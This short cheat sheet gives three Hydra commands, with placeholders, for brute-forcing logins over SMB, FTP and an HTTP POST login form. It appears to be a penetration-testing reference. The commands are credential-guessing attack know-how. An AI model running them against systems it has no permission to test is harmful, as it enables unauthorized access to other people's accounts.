# Brute force passwords over SMB
```sh
hydra -l <user> -P <path_to_passwords> smb://<ip>
```

# Brute force usernames and passwords over FTP
```sh
hydra -L <path_to_usernames> -P <path_to_passwords> -u -e snr -s <port> <ip> ftp
```

# Brute force usernames and passwords over HTTP-POST-FORM
```sh
hydra -L <path_to_usernames> -P <path_to_passwords> -s <port> <ip> http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect information"
# "page:payload:error"
```
